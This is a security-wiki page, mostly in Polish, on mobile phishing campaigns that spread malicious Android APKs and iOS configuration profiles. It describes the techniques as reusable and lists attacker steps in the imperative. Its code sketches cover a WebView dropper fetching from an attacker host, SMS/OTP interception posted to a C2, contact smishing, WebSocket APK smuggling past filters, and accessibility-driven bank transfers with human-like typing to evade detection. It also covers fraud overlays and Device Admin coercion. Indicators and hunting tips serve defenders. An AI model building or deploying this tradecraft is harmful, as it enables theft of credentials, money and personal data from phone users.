# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ta strona opisuje techniki używane przez threat actors do dystrybucji **malicious Android APKs** i **iOS mobile-configuration profiles** poprzez phishing (SEO, social engineering, fake stores, dating apps itp.). Materiał jest zaadaptowany z kampanii SarangTrap ujawnionej przez Zimperium zLabs (2025) oraz innych publicznych badań.

## Przebieg ataku

1. **SEO/Phishing Infrastructure**
* Zarejestruj dziesiątki look-alike domen (serwisy randkowe, cloud share, car service…).
– Użyj słów kluczowych w lokalnym języku i emoji w elemencie `<title>`, aby poprawić pozycję w Google.
– Hostuj *oba* Android (`.apk`) i iOS install instructions na tej samej landing page.
2. **First Stage Download**
* Android: direct link to an *unsigned* or “third-party store” APK.
* iOS: `itms-services://` or plain HTTPS link to a malicious **mobileconfig** profile (see below).
3. **Post-install Social Engineering**
* Przy pierwszym uruchomieniu aplikacja prosi o **kod zaproszenia / weryfikacyjny** (iluzja ekskluzywnego dostępu).
* Kod jest **POSTed over HTTP** do Command-and-Control (C2).
* C2 replies `{"success":true}` ➜ malware continues.
* Analiza dynamiczna Sandbox / AV, która nigdy nie przesyła prawidłowego kodu, nie wykrywa **no malicious behaviour** (evasion).
4. **Runtime Permission Abuse** (Android)
* Niebezpieczne uprawnienia są żądane dopiero **po pozytywnej odpowiedzi C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Nowsze warianty **remove `<uses-permission>` for SMS from `AndroidManifest.xml`** ale zostawiają ścieżkę Java/Kotlin, która odczytuje SMS przez reflection ⇒ obniża to ocenę statyczną, a jednocześnie działa na urządzeniach, które przyznały uprawnienie przez nadużycie `AppOps` lub na starszych targetach.
5. **Facade UI & Background Collection**
* Aplikacja pokazuje nieszkodliwe widoki (SMS viewer, gallery picker) implementowane lokalnie.
* W międzyczasie exfiltrates:
- IMEI / IMSI, phone number
- Full `ContactsContract` dump (JSON array)
- JPEG/PNG z `/sdcard/DCIM` skompresowane przy użyciu [Luban](https://github.com/Curzibn/Luban) w celu zmniejszenia rozmiaru
- Opcjonalna treść SMS (`content://sms`)
Payloads are **batch-zipped** i wysyłane przez `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Pojedynczy **mobile-configuration profile** może zażądać `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itp., aby zarejestrować urządzenie w nadzorze przypominającym “MDM”.
* Social-engineering instructions:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* three times (screenshots on the phishing page).
3. Trust the unsigned profile ➜ attacker gains *Contacts* & *Photo* entitlement without App Store review.
7. **Network Layer**
* Plain HTTP, często na porcie 80 z HOST header typu `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (brak TLS → łatwe do wykrycia).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Podczas oceny malware zautomatyzuj fazę wprowadzania kodu zaproszenia przy użyciu Frida/Objection, aby osiągnąć złośliwy branch.
* **Manifest vs. Runtime Diff** – Porównaj `aapt dump permissions` z runtime `PackageManager#getRequestedPermissions()`; brakujące dangerous perms to czerwony alert.
* **Network Canary** – Skonfiguruj `iptables -p tcp --dport 80 -j NFQUEUE`, aby wykryć nieprawidłowe serie POST po wprowadzeniu kodu.
* **mobileconfig Inspection** – Użyj `security cms -D -i profile.mobileconfig` na macOS, aby wylistować `PayloadContent` i wykryć nadmierne entitlements.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Wskaźniki (ogólne)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Wzorzec ten zaobserwowano w kampaniach wykorzystujących motywy dotyczące świadczeń rządowych w celu kradzieży indyjskich danych logowania UPI i kodów OTP. Operatorzy łączą renomowane platformy w łańcuch dostawy, aby zwiększyć zasięg i odporność.

### Delivery chain across trusted platforms
- Wabik wideo na YouTube → opis zawiera krótki link
- Krótki link → strona phishingowa na GitHub Pages udająca legalny portal
- To samo repozytorium GitHub hostuje APK z fałszywym “Google Play” badge prowadzącym bezpośrednio do pliku
- Dynamiczne strony phishingowe działają na Replit; zdalny kanał poleceń używa Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Pierwsze APK to instalator (dropper), który zawiera prawdziwe malware w `assets/app.apk` i prosi użytkownika o wyłączenie Wi‑Fi/danych komórkowych, aby stłumić wykrywanie w chmurze.
- Osadzony payload instaluje się pod niepozorną etykietą (np. “Secure Update”). Po instalacji zarówno instalator, jak i payload występują jako osobne aplikacje.

Static triage tip (grep for embedded payloads):

---
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamic endpoint discovery via shortlink
- Malware pobiera listę w formacie plain-text, comma-separated żywych endpoints z shortlink; proste string transforms generują końcową ścieżkę phishing page.

Przykład (oczyszczony):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokod:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Krok „Make payment of ₹1 / UPI‑Lite” ładuje złośliwy formularz HTML z dynamicznego endpointu wewnątrz WebView i przechwytuje poufne pola (phone, bank, UPI PIN), które są wysyłane metodą `POST` do `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Samopropagacja i przechwytywanie SMS/OTP
- Na pierwszym uruchomieniu żądane są agresywne uprawnienia:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakty są przetwarzane w pętli, aby masowo wysyłać smishing SMS-y z urządzenia ofiary.
- Przychodzące SMS-y są przechwytywane przez broadcast receiver i przesyłane z metadanymi (nadawca, treść, slot SIM, losowe ID przypisane do urządzenia) do `/addsm.php`.

Szkic odbiornika:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) jako odporny C2
- Payload rejestruje się w FCM; wiadomości push zawierają pole `_type`, wykorzystywane jako przełącznik do wyzwalania akcji (np. aktualizacja szablonów tekstów phishing, przełączanie zachowań).

Przykładowy payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Szkic handlera:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Wskaźniki/IOCs
- APK zawiera dodatkowy payload w `assets/app.apk`
- WebView ładuje payment z `gate.htm` i exfiltrates do `/addup.php`
- SMS exfiltration do `/addsm.php`
- Pobieranie konfiguracji sterowane shortlinkiem (np. `rebrand.ly/*`) zwracające CSV endpoints
- Aplikacje oznaczone jako ogólne “Update/Secure Update”
- Wiadomości FCM `data` z dyskryminatorem `_type` w niezaufanych aplikacjach

---

## Socket.IO/WebSocket-based APK Smuggling + Fałszywe strony Google Play

Atakujący coraz częściej zastępują statyczne linki do APK kanałem Socket.IO/WebSocket osadzonym w przynętach wyglądających jak Google Play. To ukrywa payload URL, omija filtry URL/extension i zachowuje realistyczny install UX.

Typowy przebieg klienta obserwowany w praktyce:

<details>
<summary>Socket.IO fałszywy downloader Google Play (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Dlaczego omija proste mechanizmy ochronne:
- Żaden statyczny URL APK nie jest ujawniany; payload jest rekonstruowany w pamięci z WebSocket frames.
- Filtry URL/MIME/extension, które blokują bezpośrednie odpowiedzi .apk, mogą nie wykryć binarnych danych tunelowanych przez WebSockets/Socket.IO.
- Crawlers i URL sandboxes, które nie wykonują WebSockets, nie pobiorą payload.

Zobacz też WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – studium przypadku RatOn

Kampania RatOn banker/RAT (ThreatFabric) jest konkretnym przykładem, jak nowoczesne operacje mobile phishing łączą WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover i nawet NFC-relay orchestration. Ta sekcja wydziela techniki nadające się do ponownego użycia.

### Stage-1: WebView → native install bridge (dropper)
Atakujący wyświetlają WebView wskazujące na stronę atakującego i wstrzykują JavaScript interface, który udostępnia native installer. Stuknięcie w HTML button wywołuje native code, który instaluje second-stage APK dołączony w dropper’s assets, a następnie uruchamia go bezpośrednio.

Minimalny wzorzec:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML na stronie:
```html
<button onclick="bridge.installApk()">Install</button>
```
Po instalacji dropper uruchamia payload za pomocą explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: nieufne aplikacje wywołujące `addJavascriptInterface()` i udostępniające WebView metody przypominające instalator; APK zawierający osadzony wtórny payload w `assets/` i wywołujący Package Installer Session API.

### Proces uzyskiwania zgody: Accessibility + Device Admin + kolejne monity runtime
Etap 2 otwiera WebView, które hostuje stronę „Access”. Jej przycisk wywołuje eksportowaną metodę, która przekierowuje ofiarę do ustawień Accessibility i prosi o włączenie złośliwej usługi. Po przyznaniu, malware używa Accessibility do automatycznego klikania przez kolejne monity uprawnień w czasie działania (contacts, overlay, manage system settings, itp.) oraz żąda Device Admin.

- Accessibility programowo pomaga zaakceptować późniejsze monity, znajdując przyciski takie jak “Allow”/“OK” w node-tree i wykonując kliknięcia.
- Sprawdzenie/żądanie uprawnienia overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Zobacz także:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom przez WebView
Operatorzy mogą wydawać polecenia, aby:
- wyrenderować pełnoekranowy overlay z URL, lub
- przekazać inline HTML ładowany do overlay WebView.

Prawdopodobne zastosowania: wymuszanie (wprowadzanie PIN), otwieranie wallet w celu przechwycenia PIN-ów, wyświetlanie komunikatów ransom. Zachowaj polecenie, które zapewni przyznanie uprawnienia overlay, jeśli go brakuje.

### Model zdalnego sterowania – pseudo-ekran tekstowy + screen-cast
- Niskopasmowy: okresowo zrzucaj drzewo węzłów Accessibility, serializuj widoczne teksty/role/bounds i wyślij do C2 jako pseudo-ekran (polecenia takie jak `txt_screen` jednorazowo i `screen_live` ciągłe).
- Wysoka wierność: zażądaj MediaProjection i rozpocznij screen-casting/nagrywanie na żądanie (polecenia jak `display` / `record`).

### ATS playbook (automatyzacja aplikacji bankowej)
Mając zadanie w JSON, otwórz aplikację bankową, steruj UI przez Accessibility za pomocą mieszanki zapytań tekstowych i stuknięć w współrzędne, i wpisz PIN płatniczy ofiary, gdy pojawi się monit.

Przykładowe zadanie:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Przykładowe teksty widziane w jednym przepływie docelowym (CZ → EN):
- "Nová platba" → "Nowa płatność"
- "Zadat platbu" → "Wprowadź płatność"
- "Nový příjemce" → "Nowy odbiorca"
- "Domácí číslo účtu" → "Krajowy numer konta"
- "Další" → "Dalej"
- "Odeslat" → "Wyślij"
- "Ano, pokračovat" → "Tak, kontynuuj"
- "Zaplatit" → "Zapłać"
- "Hotovo" → "Gotowe"

Operatorzy mogą także sprawdzać/podnosić limity przelewów za pomocą poleceń takich jak `check_limit` i `limit`, które nawigują po UI limitów w podobny sposób.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: odblokuj (skradziony PIN lub podane hasło), przejdź do Security/Recovery, pokaż seed phrase, keylog/exfiltrate it. Zaimplementuj selektory uwzględniające lokalizację (EN/RU/CZ/SK), aby ustabilizować nawigację w różnych językach.

### Device Admin coercion
Device Admin APIs są używane do zwiększenia możliwości przechwytywania PIN-u i sfrustrowania ofiary:

- Immediate lock:
```java
dpm.lockNow();
```
- Wygasić bieżące poświadczenie, aby wymusić zmianę (Accessibility przechwytuje nowy PIN/hasło):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Wymuś odblokowanie bez biometrii, wyłączając funkcje biometryczne keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Uwaga: Wiele kontroli DevicePolicyManager wymaga Device Owner/Profile Owner na nowszych wersjach Androida; niektóre buildy OEM mogą być mniej restrykcyjne. Zawsze zweryfikuj na docelowym OS/OEM.

### Orkiestracja NFC relay (NFSkate)
Stage-3 może zainstalować i uruchomić zewnętrzny moduł NFC-relay (np. NFSkate) i nawet przekazać mu szablon HTML, aby poprowadzić ofiarę podczas relayu. Pozwala to na bezkontaktowe wypłaty przy obecności fizycznej karty równolegle z online ATS.

Tło: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Zestaw poleceń operatora (przykład)
- UI/stan: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Nakładki: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Portfele: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Urządzenie: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Komunikacja/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Mechanizmy anty-detekcyjne dla ATS oparte na Accessibility: rytm tekstu podobny do ludzkiego i podwójne wstrzykiwanie tekstu (Herodotus)

Aktorzy zagrażający coraz częściej łączą automatyzację opartą na Accessibility z mechanizmami anty-detekcyjnymi nastawionymi na omijanie prostych biometrycznych heurystyk zachowania. Niedawny banker/RAT pokazuje dwa uzupełniające się tryby dostarczania tekstu oraz przełącznik operatora do symulacji ludzkiego pisania z losowym rytmem.

- Tryb wykrywania: enumeruje widoczne węzły z selektorami i bounds, aby precyzyjnie celować w inputy (ID, text, contentDescription, hint, bounds) przed działaniem.
- Podwójne wstrzykiwanie tekstu:
- Tryb 1 – `ACTION_SET_TEXT` bezpośrednio na docelowym node (stabilne, bez klawiatury);
- Tryb 2 – ustawienie schowka + `ACTION_PASTE` do fokusowanego node'a (działa, gdy bezpośrednie setText jest zablokowane).
- Rytm podobny do ludzkiego: podziel ciąg dostarczony przez operatora i wprowadzaj go znak-po-znaku z losowanymi opóźnieniami 300–3000 ms między zdarzeniami, aby ominąć heurystyki "pisania z prędkością maszyny". Zaimplementowane albo przez stopniowe rozrastanie wartości za pomocą `ACTION_SET_TEXT`, albo przez wklejanie po jednym znaku naraz.

<details>
<summary>Szkic Java: node discovery + opóźnione wprowadzanie po-znakowe przez setText lub clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Nakładki blokujące jako przykrywka do oszustw:
- Renderuj pełnoekranowy `TYPE_ACCESSIBILITY_OVERLAY` z kontrolowaną przez operatora przezroczystością; utrzymuj go nieprzezroczystym dla ofiary, podczas gdy zdalna automatyzacja działa pod spodem.
- Zazwyczaj udostępniane polecenia: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Minimalna nakładka z regulowaną alfą:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Często spotykane prymitywy sterowania operatora: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (udostępnianie ekranu).

## Źródła

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
